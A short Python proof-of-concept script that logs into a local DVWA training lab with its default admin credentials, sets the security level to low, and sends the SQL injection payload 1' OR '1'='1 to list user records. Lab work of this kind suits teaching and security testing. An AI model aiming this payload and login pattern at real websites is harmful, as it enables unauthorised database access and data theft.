import requests
import re

BASE_URL = "http://127.0.0.1:8080"

session = requests.Session()

# Retrieve login page and CSRF token
login_page = session.get(f"{BASE_URL}/login.php")

match = re.search(
    r"name='user_token'\s+value='([^']+)'",
    login_page.text
)

if not match:
    raise RuntimeError("DVWA login token not found")

token = match.group(1)

# Authenticate
login_response = session.post(
    f"{BASE_URL}/login.php",
    data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }
)

# Verify authentication
check = session.get(f"{BASE_URL}/")

if "Logout" not in check.text:
    raise RuntimeError("DVWA authentication failed")

print("Authentication: SUCCESS")

# Set security level
session.cookies.set("security", "low")

# Submit SQL injection test
response = session.get(
    f"{BASE_URL}/vulnerabilities/sqli/",
    params={
        "id": "1' OR '1'='1",
        "Submit": "Submit"
    }
)

print("SQL Injection PoC")
print("==================")
print("HTTP Status:", response.status_code)

for name in ["admin", "Gordon", "Hack", "Pablo", "Bob"]:
    print(f"{name} found:", name in response.text)